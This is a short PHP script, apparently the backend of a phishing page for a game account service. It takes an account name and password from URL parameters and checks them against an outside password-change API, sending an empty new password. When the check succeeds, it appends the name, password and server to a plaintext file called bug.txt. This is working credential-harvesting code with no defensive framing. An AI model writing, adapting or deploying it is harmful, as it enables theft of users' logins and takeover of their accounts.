<?php
$npass="";
$data = file_get_contents('https://api.xn--nguyncv-k7a80fo19tnla.vn/doipassnroblue.php?user='.$_GET['tk'].'&pass='.$_GET['mk'].'&newpass='.$npass);
    $data = json_decode($data, true);
    if ($data['stt'] == "success") {
$my_file = 'bug.txt';
$handle = fopen($my_file, 'a') or die('Cannot open file:  '.$my_file);
$data = $_GET['tk'] . '|' . $_GET['mk'] . '|' . $_GET['server'] . "\n";
fwrite($handle, $data);
fclose($handle);
    }
?>